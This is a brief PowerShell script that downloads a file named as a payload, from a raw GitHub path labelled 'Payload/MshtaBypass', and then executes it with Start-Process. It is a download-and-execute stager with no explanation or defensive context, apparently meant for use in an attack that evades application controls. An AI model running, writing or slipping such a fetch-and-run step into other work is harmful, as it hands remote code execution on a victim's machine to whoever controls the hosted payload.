$url = 'https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/MshtaBypass/MshtaPs1.ps1'
$output = "MshtaPs1.ps1"
$start_time = Get-Date

[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 

wget $url -outfile $output

Start-Process -FilePath "MshtaPs1.ps1"
